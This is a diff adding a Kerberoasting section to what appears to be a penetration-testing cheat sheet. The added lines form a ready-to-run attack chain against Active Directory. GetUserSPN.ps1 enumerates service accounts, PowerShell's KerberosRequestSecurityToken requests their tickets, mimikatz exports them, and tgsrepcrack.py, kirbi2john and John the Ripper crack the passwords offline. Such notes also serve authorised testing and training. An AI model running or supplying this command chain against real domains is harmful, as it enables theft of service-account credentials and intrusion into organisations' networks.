@@ -1562,8 +1562,22 @@ john --fork=number_of_processes_here -w=/path/to/wordlist /path/to/hash
 
 ## KERBEROAST
 ```
-# crack SPN's password on TGS (service ticket)
-python /path/to/kerberoast/tgsrepcrack.py /path/to/wordlist /path/to/kirbi
+# get users with Service Principal Names (SPNs)
+GetUSerSPN.ps1
+
+# Get service ticket
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestSecurityToken -ArgumentList "SPN_here"
+
+# extract tickets
+mimkatz # kerberos::list /export
+
+# crack tickets
+./tgsrepcrack.py /path/to/wordlist /path/to/kirbi
+# convert kirbi to john
+/path/to/kirbi2john.py /path/to/kirbi > out_file_here
+# crack
+john -w=/path/to/wordlist /path/to/john/file
 ```
 
 
